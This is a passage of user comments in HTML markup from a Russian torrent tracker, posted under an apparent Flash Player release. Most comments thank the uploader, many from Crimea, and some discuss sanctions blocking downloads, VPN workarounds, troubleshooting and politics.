Переустанавливал флэш, не помогает...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>findddd</b></td> <td>13-12-2016 19:45:48 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2894607"></span><script type="text/javascript">cOptions(1334523,2894607);</script></td></tr><tr><td class="c_t" colspan=4>я чет запутался,сейчас флеш вообще нужен на компе или нет?Что с ним что без никакой разницы не заметил.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tftyeee</b></td> <td>11-10-2016 19:42:10 (19 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2852739"></span><script type="text/javascript">cOptions(1415137,2852739);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо от моей дочки(не шли флеш-игры).ГРОМАДНОЕ СПАСИБО избавили от головной боли...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Radjah</b></td> <td>15-09-2016 11:06:57 (20 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2834951"></span><script type="text/javascript">cOptions(1161898,2834951);</script></td></tr><tr><td class="c_t" colspan=4>Благодарю!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Мад3333</b></td> <td>14-09-2016 19:20:21 (20 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2834683"></span><script type="text/javascript">cOptions(346221,2834683);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо!!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>k.d.r. 69</b></td> <td>14-09-2016 17:33:32 (20 месяцев назад)</td> <td></td> <td align="right"><span id="c_2834612"></span><script type="text/javascript">cOptions(817041,2834612);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо Вам Большое за обновку !!! <img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>jin92rus</b></td> <td>05-08-2016 18:29:37 (21 месяц назад)</td> <td></td> <td align="right"><span id="c_2808758"></span><script type="text/javascript">cOptions(1251568,2808758);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/respects.gif" /><img src="http://s.rutor.info/t/smilies/thankyou.gif" /><img src="http://s.rutor.info/t/smilies/bubs.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>333444555</b></td> <td>13-07-2016 6:30:35 (22 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2797128"></span><script type="text/javascript">cOptions(1280247,2797128);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Sharapow</b></td> <td>12-07-2016 19:10:18 (22 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2796767"></span><script type="text/javascript">cOptions(1305295,2796767);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо!!! Севастопольцы ценят ваши труды!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Riba-Me4</b></td> <td>23-06-2016 19:42:52 (23 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2786745"></span><script type="text/javascript">cOptions(1454649,2786745);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>SSSR_82</b></td> <td>01-06-2016 16:51:16 (24 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2774500"></span><script type="text/javascript">cOptions(1453008,2774500);</script></td></tr><tr><td class="c_t" colspan=4>Крымчаны з Новоросии це кажу  чинкують ВАс !!! Доброго здоровьячка, гарный плеер!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>andmigal</b></td> <td>09-04-2016 3:25:14 (25 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2740600"></span><script type="text/javascript">cOptions(896700,2740600);</script></td></tr><tr><td class="c_t" colspan=4>Крымчане благодарят ВАс !!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>xorda777</b></td> <td>08-04-2016 17:36:12 (25 месяцев назад)</td> <td></td> <td align="right"><span id="c_2740301"></span><script type="text/javascript">cOptions(842667,2740301);</script></td></tr><tr><td class="c_t" colspan=4>Ну как обычно, всё работает, спасибо<img src="http://s.rutor.info/t/smilies/peace2.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>k.d.r. 69</b></td> <td>08-04-2016 11:14:07 (25 месяцев назад)</td> <td></td> <td align="right"><span id="c_2740075"></span><script type="text/javascript">cOptions(817041,2740075);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо Вам Большое за обновку!!! <img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>dimon1310mi</b></td> <td>18-03-2016 9:44:39 (26 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2724882"></span><script type="text/javascript">cOptions(1446211,2724882);</script></td></tr><tr><td class="c_t" colspan=4>Крым Бахчисарай Спасибо!<img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>zlobvet</b></td> <td>16-03-2016 22:12:54 (26 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2724013"></span><script type="text/javascript">cOptions(315947,2724013);</script></td></tr><tr><td class="c_t" colspan=4>Огромное человеческое СПАСИБО из Симферополя за обновление!!!<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sergio-a1</b></td> <td>12-03-2016 14:07:13 (26 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2721110"></span><script type="text/javascript">cOptions(1445677,2721110);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо от Симферополя и окрестностей! У вас всегда оперативно появляются последние версии плеера. Как только засвербило)) - сразу сюда за обновой)))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>SIROP71</b></td> <td>11-03-2016 20:23:49 (26 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2720665"></span><script type="text/javascript">cOptions(382952,2720665);</script></td></tr><tr><td class="c_t" colspan=4>Красавцы Крымчане!!! Приятно читать такие комменты!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sasha1970-1970</b></td> <td>19-02-2016 23:03:22 (27 месяцев назад)</td> <td></td> <td align="right"><span id="c_2706330"></span><script type="text/javascript">cOptions(1278867,2706330);</script></td></tr><tr><td class="c_t" colspan=4>От Крымчан БОЛЬШОЕ СПАСИБО!Ждём в гости!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>mista_dj</b></td> <td>19-02-2016 8:03:35 (27 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2705762"></span><script type="text/javascript">cOptions(1389938,2705762);</script></td></tr><tr><td class="c_t" colspan=4>Симферополь, респект!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Roman-Roman</b></td> <td>11-02-2016 22:41:51 (27 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2700303"></span><script type="text/javascript">cOptions(1106941,2700303);</script></td></tr><tr><td class="c_t" colspan=4>Крымчанам огромнейший привет из Гродно! До встречи в июне!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>килгор траут</b></td> <td>11-02-2016 22:28:51 (27 месяцев назад)</td> <td></td> <td align="right"><span id="c_2700292"></span><script type="text/javascript">cOptions(1280010,2700292);</script></td></tr><tr><td class="c_t" colspan=4>Севастополь. Спасибо.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ol.sdy</b></td> <td>09-01-2016 0:05:10 (28 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2674285"></span><script type="text/javascript">cOptions(745092,2674285);</script></td></tr><tr><td class="c_t" colspan=4>Крымчанам Привет!!! Сегодня смог обновиться наконец-то через офсайт. А весь год только эти обновки и выручали!! за что аторам и релизёрам Огромное Спасибо!!! <img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tumsotu</b></td> <td>28-12-2015 17:04:40 (29 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2667459"></span><script type="text/javascript">cOptions(205399,2667459);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Голландии <img src="http://s.rutor.info/t/smilies/salut.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>jin92rus</b></td> <td>14-12-2015 18:26:01 (29 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2656115"></span><script type="text/javascript">cOptions(1251568,2656115);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /><img src="http://s.rutor.info/t/smilies/thumbsup.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>vlasov_vic</b></td> <td>11-12-2015 21:05:27 (29 месяцев назад)</td> <td></td> <td align="right"><span id="c_2653823"></span><script type="text/javascript">cOptions(1249431,2653823);</script></td></tr><tr><td class="c_t" colspan=4>спасибо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>facetus</b></td> <td>11-12-2015 11:08:52 (29 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2653358"></span><script type="text/javascript">cOptions(1426478,2653358);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из ФЕОДОСИИ!<br />
+<br />
+Побывал анонимайзеры - не получилось, так и сидел пол года клацал &quot;Разрешить&quot; &quot;Оставить включенным&quot; =)) надоело и вот...:)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>kapralpv</b></td> <td>10-12-2015 19:46:02 (29 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2652910"></span><script type="text/javascript">cOptions(353837,2652910);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Феодосии!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Leon-Killer</b></td> <td>10-12-2015 19:32:14 (29 месяцев назад)</td> <td></td> <td align="right"><span id="c_2652898"></span><script type="text/javascript">cOptions(1234112,2652898);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо! Крымчане вам благодарны!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Rayn</b></td> <td>09-12-2015 20:04:39 (29 месяцев назад)</td> <td></td> <td align="right"><span id="c_2652118"></span><script type="text/javascript">cOptions(720755,2652118);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо, братцы, крымчане вам благодарны!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>perdoname</b></td> <td>09-12-2015 19:57:00 (29 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2652108"></span><script type="text/javascript">cOptions(1033596,2652108);</script></td></tr><tr><td class="c_t" colspan=4>Скажите кто-нибудь, ибо мне непонятно - почему АдобФлеш не работает в Яндекс-Браузере ?!..</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sasapai</b></td> <td>08-12-2015 22:49:59 (29 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2651406"></span><script type="text/javascript">cOptions(305265,2651406);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо, Брат! Севастополь благодарит. Спасибо, выручил.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Pesticide</b></td> <td>30-11-2015 12:16:56 (30 месяцев назад)</td> <td></td> <td align="right"><span id="c_2643770"></span><script type="text/javascript">cOptions(972973,2643770);</script></td></tr><tr><td class="c_t" colspan=4>Дьякову спасибо!<br />
+PS Ух ты, сколько курятины завезли!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pulia2013</b></td> <td>10-11-2015 19:33:38 (30 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2624525"></span><script type="text/javascript">cOptions(811705,2624525);</script></td></tr><tr><td class="c_t" colspan=4>ура крымчане с нами!!!!!!!!!<br />
+привет всем от белорусов  <br />
+<br />
+<br />
+а дъякову как всегда  10-спасибо</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sheet2006</b></td> <td>23-10-2015 7:31:15 (31 месяц назад)</td> <td></td> <td align="right"><span id="c_2606846"></span><script type="text/javascript">cOptions(302057,2606846);</script></td></tr><tr><td class="c_t" colspan=4>спасибо, я из Крыма...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sasha1970-1970</b></td> <td>22-10-2015 21:20:18 (31 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2606564"></span><script type="text/javascript">cOptions(1278867,2606564);</script></td></tr><tr><td class="c_t" colspan=4>Да,да!От Крымчан большое спасибо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Ku4a7</b></td> <td>22-10-2015 20:13:44 (31 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2606471"></span><script type="text/javascript">cOptions(659154,2606471);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Крыма в который раз.Так держать)))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>77sergej</b></td> <td>22-10-2015 9:00:02 (31 месяц назад)</td> <td></td> <td align="right"><span id="c_2605937"></span><script type="text/javascript">cOptions(1360487,2605937);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо товарищу Бамби за наше счастливое детство)ОБМ ПНХ</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Dimidrol13666</b></td> <td>21-10-2015 20:25:50 (31 месяц назад)</td> <td></td> <td align="right"><span id="c_2605624"></span><script type="text/javascript">cOptions(1401927,2605624);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо ! :)  Привет из Севастополя !</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>kolek</b></td> <td>13-10-2015 22:45:34 (31 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2599644"></span><script type="text/javascript">cOptions(98800,2599644);</script></td></tr><tr><td class="c_t" colspan=4>оо севастополь тут))спасибо</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sebastian.pereira.</b></td> <td>13-10-2015 21:12:14 (31 месяц назад)</td> <td></td> <td align="right"><span id="c_2599537"></span><script type="text/javascript">cOptions(1367148,2599537);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Российского Крыма и самой Российской Алушты!!!!!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Acxa2011</b></td> <td>04-10-2015 11:05:38 (32 месяца назад)</td> <td>Оценил на: <b>9</b></td> <td align="right"><span id="c_2592018"></span><script type="text/javascript">cOptions(1376664,2592018);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо за репак из Крыма, Сакский район :)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>WARAHA</b></td> <td>03-10-2015 21:22:43 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2591641"></span><script type="text/javascript">cOptions(228373,2591641);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из центрального Крыма! :)<br />
+//я смотрю тут наши в каментах в основном)) санкции такие санкции :D<br />
+Кароч, прикиньте, нам еще и sourceforge закрыли, ну это помимо плэймаркета разумеется, в общем тока VPN и спасает, и то не везде. <br />
+Обаму на том свете будут черти жарить в жопу при помощи MSDN -))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Eyes</b></td> <td>02-10-2015 9:11:03 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2590299"></span><script type="text/javascript">cOptions(1364499,2590299);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Севастополя(Россия)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Leon-Killer</b></td> <td>23-09-2015 21:36:37 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2583305"></span><script type="text/javascript">cOptions(1234112,2583305);</script></td></tr><tr><td class="c_t" colspan=4>Благодарочка из Симферополя!!! </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>bivak</b></td> <td>23-09-2015 19:42:37 (32 месяца назад)</td> <td></td> <td align="right"><span id="c_2583202"></span><script type="text/javascript">cOptions(411909,2583202);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из всегда украинской Алушты!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>eXust_eXo</b></td> <td>22-09-2015 9:11:58 (32 месяца назад)</td> <td></td> <td align="right"><span id="c_2581925"></span><script type="text/javascript">cOptions(1389965,2581925);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Усинска!!! (из респ Коми)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Glukvik</b></td> <td>22-09-2015 8:01:19 (32 месяца назад)</td> <td></td> <td align="right"><span id="c_2581886"></span><script type="text/javascript">cOptions(1374998,2581886);</script></td></tr><tr><td class="c_t" colspan=4>Все быстро,оперативно.Уважуха!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Nargaroth</b></td> <td>21-09-2015 21:27:57 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2581646"></span><script type="text/javascript">cOptions(1292476,2581646);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Инзы))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Otblesk1</b></td> <td>21-09-2015 20:56:29 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2581623"></span><script type="text/javascript">cOptions(1382743,2581623);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо от Севастополя!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Jackassic</b></td> <td>21-09-2015 19:03:05 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2581530"></span><script type="text/javascript">cOptions(482827,2581530);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Керчи</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>lxe</b></td> <td>21-09-2015 18:18:30 (32 месяца назад)</td> <td></td> <td align="right"><span id="c_2581501"></span><script type="text/javascript">cOptions(1318067,2581501);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Ульяновска</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>boz</b></td> <td>18-09-2015 1:59:37 (32 месяца назад)</td> <td></td> <td align="right"><span id="c_2578616"></span><script type="text/javascript">cOptions(129831,2578616);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Ялты!!!(судя по всему проблем<br />
+ы ток в Крыму)<br />
+<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Aleksu</b></td> <td>17-09-2015 22:57:08 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2578495"></span><script type="text/javascript">cOptions(359548,2578495);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо D!akovu из Симферополя!!![img]<img src="http://s.rutor.info/t/smilies/thankyou.gif" />[/img]</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Ma3ena</b></td> <td>17-09-2015 16:15:16 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2578081"></span><script type="text/javascript">cOptions(1388065,2578081);</script></td></tr><tr><td class="c_t" colspan=4>Огромное спасибо из Севастополя=)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Shokolate2015</b></td> <td>16-09-2015 10:24:52 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2576981"></span><script type="text/javascript">cOptions(1387572,2576981);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /> из Севастополя)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>flamehorse</b></td> <td>11-09-2015 16:12:11 (32 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2572687"></span><script type="text/javascript">cOptions(129580,2572687);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Украинской Одессы!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sheet2006</b></td> <td>06-09-2015 8:04:51 (33 месяца назад)</td> <td></td> <td align="right"><span id="c_2568436"></span><script type="text/javascript">cOptions(302057,2568436);</script></td></tr><tr><td class="c_t" colspan=4>спасибо из Крыма...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Yorik2009</b></td> <td>13-08-2015 18:17:45 (33 месяца назад)</td> <td></td> <td align="right"><span id="c_2551278"></span><script type="text/javascript">cOptions(864516,2551278);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Евгения.</b></td> <td>12-08-2015 21:36:39 (33 месяца назад)</td> <td></td> <td align="right"><span id="c_2550761"></span><script type="text/javascript">cOptions(1373744,2550761);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Русской Макеевки.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>WET/</b></td> <td>12-08-2015 15:49:13 (33 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2550553"></span><script type="text/javascript">cOptions(1373637,2550553);</script></td></tr><tr><td class="c_t" colspan=4>Отличная раздача. Спасибо от Русского Луганска</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Ancle Joe</b></td> <td>12-08-2015 12:51:55 (33 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2550445"></span><script type="text/javascript">cOptions(152042,2550445);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Спасибо из Украинского Севастополя!</fieldset>Ух ты, украинцы построили свой Севастополь!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Pesticide</b></td> <td>11-08-2015 18:35:09 (33 месяца назад)</td> <td></td> <td align="right"><span id="c_2550032"></span><script type="text/javascript">cOptions(972973,2550032);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Спасибо из Украинского Севастополя!</fieldset><br />
+<br />
++1.<br />
+<br />
+За обнову спасибо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Тигерь</b></td> <td>11-08-2015 16:24:47 (33 месяца назад)</td> <td></td> <td align="right"><span id="c_2549943"></span><script type="text/javascript">cOptions(1373323,2549943);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Украинского Севастополя!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Denis_48rus</b></td> <td>11-08-2015 15:39:30 (33 месяца назад)</td> <td></td> <td align="right"><span id="c_2549921"></span><script type="text/javascript">cOptions(1305145,2549921);</script></td></tr><tr><td class="c_t" colspan=4>ребят я установил, но там написано версия подключаемого модуля.. не установлен</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>bruxsa</b></td> <td>28-07-2015 21:29:22 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2540142"></span><script type="text/javascript">cOptions(179459,2540142);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>=IRSS=4ymaDaH44</b></td> <td>27-07-2015 19:08:01 (34 месяца назад)</td> <td></td> <td align="right"><span id="c_2539401"></span><script type="text/javascript">cOptions(683283,2539401);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Джанкоя!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Таня_О</b></td> <td>27-07-2015 14:56:27 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2539238"></span><script type="text/javascript">cOptions(1368303,2539238);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>koalastalker</b></td> <td>26-07-2015 15:10:56 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2538320"></span><script type="text/javascript">cOptions(1367973,2538320);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо... Русские НЕ СДАЮТСЯ</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Bastet1369</b></td> <td>19-07-2015 14:38:35 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2533682"></span><script type="text/javascript">cOptions(1365776,2533682);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо из Симферополя!!!!)))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>daddyback</b></td> <td>15-07-2015 20:00:18 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2530926"></span><script type="text/javascript">cOptions(1364687,2530926);</script></td></tr><tr><td class="c_t" colspan=4>спасибо из Ялты</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Baloun</b></td> <td>15-07-2015 19:40:22 (34 месяца назад)</td> <td></td> <td align="right"><span id="c_2530899"></span><script type="text/javascript">cOptions(894014,2530899);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />в интернет-магазине гугла, с которого мы ничего все-равно скачать не можем</fieldset><br />
+<br />
+Православным Фуррифоксом нужно пользоваться а не хромом, и к нему уже прикручивать ZenMate,например.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>15-07-2015 16:43:34 (34 месяца назад)</td> <td></td> <td align="right"><span id="c_2530775"></span><script type="text/javascript">cOptions(805410,2530775);</script></td></tr><tr><td class="c_t" colspan=4><a href="https://www.virustotal.com/ru/file/dbff93717bddd36a3a8cb9c572f3fb79703799b3c50057a1b9f12bd1c320221b/analysis/" target="_blank">https://www.virustotal.com/ru/file/dbff93717bddd36a3a8cb9c572f3fb79703799b3c50057a1b9f12bd1c320221b/analysis/</a></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Зенитовец</b></td> <td>15-07-2015 15:54:46 (34 месяца назад)</td> <td></td> <td align="right"><span id="c_2530735"></span><script type="text/javascript">cOptions(1157878,2530735);</script></td></tr><tr><td class="c_t" colspan=4>Ещё вчера обновился с официального сайта.<img src="http://s.rutor.info/t/smilies/yes.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Alexey_</b></td> <td>15-07-2015 13:38:17 (34 месяца назад)</td> <td></td> <td align="right"><span id="c_2530655"></span><script type="text/javascript">cOptions(135840,2530655);</script></td></tr><tr><td class="c_t" colspan=4>В нашем веке все возможно уже. Анонимайзеров и прочего на просторах интернета - уйма. Не спорю.<br />
+Но к чему осуждать людей, пытающихся просто скачать без всякого гемора, не меняя айпи адреса, не устанавливая прог и расширений ради этого? Т.б. этот вундеркинд, так ярко рассказывающий про людские занятия, делится ссылкой на расширения впн, находящиеся в интернет-магазине гугла, с которого мы ничего все-равно скачать не можем. Или может нам надо воспользоваться внешней прогой впн, чтобы скачать успешно расширение на браузер?) Слишком извращенно.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>SkyTears</b></td> <td>15-07-2015 12:33:38 (34 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2530627"></span><script type="text/javascript">cOptions(1326772,2530627);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Видимо кто-то просто не вкурсе, что на Крым наложили санкции и умничает не зная сути проблемы. У нас закрыли доступ такие к примеру компании, как гугл и теперь не браузером, не всякими финтифлюшками типо гугл плей или интернет-магазин гугла - не попользуешься, находясь на полуострове. Инфы об этом полно в инете, ознакомься, пред тем, как людей за дураков круглых держать.<br />
+<br />
+Я же ниже описывал ситуацию, как с хромом мучился. Даже просил скачать подругу из мск, чтобы она мне установочный файл гугла, скаченный у себя, скинула. Не устанавливается никак. Только к инету подключаешься, сразу определяет откуда ты используешь его.<br />
+<br />
+Читая комментарии людей, не показалось случайным, что практически все эти города, озвученные ими - крымские ?</fieldset><br />
